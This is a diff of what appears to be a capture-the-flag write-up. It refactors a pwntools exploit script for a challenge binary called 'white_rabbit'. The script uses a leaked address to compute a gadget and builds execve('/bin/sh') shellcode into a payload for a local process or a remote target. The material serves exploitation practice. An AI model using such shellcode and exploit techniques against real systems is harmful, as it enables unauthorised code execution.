@@ -128,48 +128,29 @@ The last one is shellcode, just basic `/bin/sh` shellcode:
 
 ```py
 #!/usr/bin/python3
-from pwn import *
+from pwncus import *
 
-# context.log_level = 'debug'
+context.log_level = 'debug'
 exe = context.binary = ELF('./white_rabbit', checksec=False)
+def GDB(): gdb.attach(p, gdbscript='''
 
 
-# Shorthanding functions for input/output
-info = lambda msg: log.info(msg)
-s = lambda data: p.send(data)
-sa = lambda msg, data: p.sendafter(msg, data)
-sl = lambda data: p.sendline(data)
-sla = lambda msg, data: p.sendlineafter(msg, data)
-sn = lambda num: p.send(str(num).encode())
-sna = lambda msg, num: p.sendafter(msg, str(num).encode())
-sln = lambda num: p.sendline(str(num).encode())
-slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
-
-# GDB scripts for debugging
-def GDB():
-    if not args.REMOTE:
-        gdb.attach(p, gdbscript='''
-
-b*follow+20
 c
-''')
+''') if not args.REMOTE else None
 
 p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
-if args.GDB:
-    GDB()
-    input()
+set_p(p)
+if args.GDB: GDB(); input()
 
 # ===========================================================
 #                          EXPLOIT
 # ===========================================================
 
-p.recvuntil(b'/ > ')
-leak = int(p.recvline()[:-1], 16)
-info("[+] Leak: " + hex(leak))
-
+ru(b'/ > ')
+leak = int(rl()[:-1], 16)
+info("Leak: " + hex(leak))
 
 gadget = leak - 0xc1
-
 shellcode = asm("""
     push 0x3b
     pop rax
@@ -191,9 +172,8 @@ pl = flat(
     p64(gadget)
     )
 
-p.sendline(pl)
-p.interactive()
-
+sl(pl)
+interactive()
 ```
 
 ```sh
